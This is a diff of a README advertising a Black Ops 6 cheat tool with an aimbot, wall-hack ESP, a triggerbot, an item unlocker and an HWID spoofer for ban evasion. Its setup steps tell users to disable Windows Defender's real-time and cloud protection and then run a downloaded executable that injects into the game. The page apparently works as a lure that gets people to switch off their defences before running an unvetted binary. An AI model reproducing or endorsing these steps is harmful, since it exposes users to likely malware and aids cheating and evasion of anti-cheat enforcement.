@@ -1,142 +1,123 @@
 # Game Enhancer
 
-> ⚠️ **Important:** Before running, ensure you disable **Real-time protection** and **Cloud-delivered protection** in Windows Defender for the tool to function properly. Failure to do so will prevent it from working. Detailed steps with screenshots for turning these settings off are included below.
+> ⚠️ **Important:** Before running, you must disable **Real-time protection** and **Cloud-delivered protection** in Windows Defender to allow the tool to function properly. Without this step, the tool will not work! See below for instructions with images.
 
----
 ![In-game Screenshot](screenshots/1.png)
 
-## Features
-**Work in progress!** The actual tool may have more features than listed here. Updates will be provided in the near future.
+## Quick Setup Guide
 
-### Aimbot
-Automatically aim at your enemies with advanced customization.
+### Step 1: Disable Windows Defender Settings
+To ensure smooth functioning, make sure **Real-time protection** and **Cloud-delivered protection** are turned off in Windows Defender:
 
-- **Highly configurable**
-- Aim hotkey
-- Field-of-view (FOV)
-- Aim smoothing
-- Target selector
-- Lock target & switch target delay after kill
-- Crosshair & snaplines display
-- Visibility checks & visibility bone scan
-- Aim at specific bone
-- Bullet prediction and advanced predictions
-- Bullet drop compensation for all guns
-- Memory aimbot
-- Mouse emulation aimbot
-
-### Character ESP
-See all players, items, and more through walls, including essential information.
-
-- **Highly configurable**
-- Battle mode
-- Adjustable render distances (max healthbar, name, info)
-- Healthbar positioning & style
-- Border style
-- Visibility checks and max bones render distance
-- Bone style
-- Displays player name, status, weapon held, grenades, mines, etc.
-
-### Triggerbot
-Automate shooting with specific settings.
-
-- Hotkey activation
-- Adjustable trigger interval time
-- Maximum distance setting
-- Option to activate only in full ADS mode
-
-### Radar
-2D Radar to easily spot surrounding enemies.
-
-- **Highly configurable**
-- Show enemies & friendly players
-- Customizable colors
-
-### Miscellaneous
-
-- **Weapon Tweaks**
-  - No recoil
-  - No ADS (Aim Down Sights)
-  - Unlock all weapon features
-
-### Stream Proof
-
-- Fully stream-proof, works with all recording software
-
-### Config System
-
-- Save settings instantly and effortlessly
-- Unlimited number of configs supported
-- Instant synchronization
-- Auto-load when starting game
-
-### Unlocker Tool
-Unlock a range of in-game features with ease.
-
-- Set any **prestige level** or **player level**
-- Access any **camo** for all weapons
-- Max out weapon levels and attachments
-- Full customization and **unlock-all** option
-
-### Shadow Ban Bypass
-Play without interruptions with HWID spoofer / Shadow ban bypass included.
-
-- **Easy Spoof & Play**
-
-### Supported Platforms
-
-- Battle.NET
-- Steam
-- Xbox Game Pass
-
----
-
-## Instructions for Disabling Windows Defender
-
-1. **Turn off Real-time protection**
+1. **Real-time protection**
    - Go to **Windows Security** > **Virus & threat protection** > **Manage settings**.
    - Toggle off **Real-time protection**.
 
-2. **Turn off Cloud-delivered protection**
+2. **Cloud-delivered protection**
    - In the same settings page, toggle off **Cloud-delivered protection**.
 
-   ![Off](screenshots/defender.png)
+   ![Windows Defender Settings](screenshots/defender.png)
+
+> ⚠️ **Note:** Both settings must be off. Otherwise, the tool will not operate as expected.
 
 ---
 
-## Setup and Launch Instructions
+### Step 2: Launching the Game Enhancer
 
-1. **Turn off Windows Defender**
-   - Make sure both **Real-time protection** and **Cloud-delivered protection** are disabled as described above.
+1. **Download the Tool**  
+   - Get `BO6ByCrenZeV.exe` from the provided link.
 
-2. **Download the Tool**
-   - Download `BO6ByCrenZeV.exe`.
+2. **Prepare for Injection**  
+   - Make sure **Black Ops 6** is closed before proceeding.
+   - Run `BO6ByCrenZeV.exe`.
 
-3. **Prepare for Launch**
-   - Ensure **Black Ops 6** is closed before launching `BO6ByCrenZeV.exe`.
-
-4. **Run the Injector**
-   - Launch `BO6ByCrenZeV.exe`. An injector will open, where you will need to enter one of these lifetime codes to gain access:
+3. **Enter Access Code**
+   - Upon launching, an injector window will open. To gain access, enter one of the lifetime codes below (unlimited use):
      - `ACCESS2024`
      - `GODMODE`
      - `CODE123`
-   - All codes provide unlimited access. After redeeming a code, you’ll be directed to the cheat selection menu.
+   - After entering a code, you’ll be directed to the **Cheat Selection Menu**.
 
-5. **Select Cheats and Inject**
-   - In the cheat selection menu, choose from the available options:
+4. **Select and Inject Cheats**
+   - In the menu, select one of the following options:
      - **BO6 Unlocker Tool**
      - **BO6 Multiplayer Hacks**
      - **BO6 Zombies Hacks**
      - **Warzone Hacks**
-   - After making your selection, click **Start Injection**. Once injection is complete, you’ll see a confirmation message: **Injection Complete**.
+   - Click **Start Injection**. After a successful injection, a confirmation message will appear: **Injection Complete**.
 
-6. **Start the Game**
-   - Open Black Ops 6, and enjoy the enhanced features!
+5. **Launch and Play**
+   - Start **Black Ops 6** and enjoy the enhanced features!
+
+![In-game Screenshot](screenshots/2.png)
 
 ---
 
-> Note: Please turn off both Windows Defender settings for the tool to work as intended. Failing to disable these protections will prevent the tool from operating.
+## Features
 
-In-game screenshots showing tool features are available below:
-![In-game Screenshot](screenshots/2.png)
+**Work in Progress!** More features are continually being added. Check back for updates!
+
+### Aimbot
+Gain automatic, customizable aiming capabilities against your enemies.
+
+- Highly configurable: adjust aim hotkey, field-of-view (FOV), smoothing, and more
+- Target selector with lock and switch target options
+- Bullet prediction, including advanced calculations and drop compensation
+- Options for crosshair, snaplines, and bone targeting
+- Memory-based aimbot and mouse emulation aimbot options
+
+### Character ESP
+Spot players and items through walls with detailed information displayed.
+
+- Fully adjustable render distances and visibility checks
+- Customizable healthbar, border, and bone styles
+- Displays player name, status, weapon, grenades, and more
+
+### Triggerbot
+Automate shooting actions with specific controls.
+
+- Hotkey activation
+- Adjustable trigger interval and max distance settings
+- Option to trigger only in full ADS mode
+
+### Radar
+Visualize surrounding enemies with a 2D radar.
+
+- Highly configurable with customizable colors
+- Option to display friendly and enemy players
+
+### Unlocker Tool
+Unlock exclusive in-game items and levels.
+
+- Set any **prestige level** or **player level**
+- Unlock any **camo** and max out weapon levels/attachments
+- Full customization with an **unlock-all** option
+
+### Miscellaneous Features
+- Weapon Tweaks: No recoil, no ADS (Aim Down Sights), and unlock all weapon features
+
+### Stream Proof
+- Fully stream-proof, compatible with all recording software
+
+### Config System
+- Save settings instantly, with support for unlimited configurations
+- Auto-load configurations upon game start
+
+### Shadow Ban Bypass
+Play worry-free with an included HWID spoofer and shadow ban bypass.
+
+- **Easy Spoof & Play** 
+
+---
+
+## Supported Platforms
+
+- **Battle.NET**
+- **Steam**
+- **Xbox Game Pass**
+
+---
+
 ![In-game Screenshot](screenshots/3.png)
+
+> **Enjoy seamless gameplay with advanced features and total customization.** Follow the setup instructions closely, and dive into the enhanced experience in Black Ops 6!
